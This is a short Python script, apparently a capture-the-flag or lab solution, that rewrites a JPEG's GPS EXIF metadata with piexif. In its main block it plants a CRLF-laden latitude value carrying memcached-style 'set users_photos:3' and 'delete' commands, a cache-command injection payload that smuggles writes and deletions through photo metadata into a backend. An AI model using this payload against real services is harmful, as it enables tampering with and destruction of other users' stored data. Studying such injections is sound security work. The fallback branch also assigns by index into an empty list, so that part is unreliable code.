import piexif
from pprint import pprint


def exploit(
        filename,
        new_lat_ref=None,
        new_lat_degrees=None,
        new_long_ref=None,
        new_long_degrees=None,
        new_filename=None):
    with open(filename, 'rb') as f:
        jpeg_bytes = f.read()
    exif = piexif.load(jpeg_bytes)
    if 'GPS' not in exif:
        exif['GPS'] = []
    gps = exif['GPS']
    pprint(gps)
    if len(exif['GPS']) < 5:
        print('No geotag in {}; making up data...'.format(filename))
        gps[0] = (2, 2, 0, 0)
        gps[1] = 'N'
        gps[2] = ((0, 1), (0, 1), (0, 1000))
        gps[3] = 'E'
        gps[4] = ((0, 1), (0, 1), (0, 1000))
    lat_ref, lat_degrees, long_ref, long_degrees = gps[1], gps[2], gps[3], gps[4]
    lat_degrees = lat_degrees[0][0]
    long_degrees = long_degrees[0][0]
    print('Current coordinates:', lat_ref, lat_degrees, long_ref, long_degrees)
    if new_lat_ref is None:
        new_lat_ref = lat_ref
    if new_lat_degrees is None:
        new_lat_degrees = lat_degrees
    if new_long_ref is None:
        new_long_ref = long_ref
    if new_long_degrees is None:
        new_long_degrees = long_degrees
    gps[1] = new_lat_ref
    gps[2] = ((new_lat_degrees, 1), *gps[2][1:])
    gps[3] = new_long_ref
    gps[4] = ((new_long_degrees, 1), *gps[4][1:])
    exif_bytes = piexif.dump(exif)
    piexif.insert(exif_bytes, filename, new_filename)
    print('Successfully modified {}: lat_ref={}, lat_degrees={}, long_ref={}, long_degrees={}'
          .format(filename, new_lat_ref, new_lat_degrees, new_long_ref, new_long_degrees))
    print('Saved into {}'.format(new_filename))


if __name__ == '__main__':
    exploit(
        'exploit.jpg',
        new_lat_ref='56E60 noreply\r\nset users_photos:3 0 0 20 noreply\r\n1,2,3,4,5,6,7,8,9,10\r\ndelete ',
        # new_lat_ref='S',
        new_lat_degrees=1,
        new_long_ref='W',
        new_long_degrees=1,
        new_filename='exploit_modified.jpg')
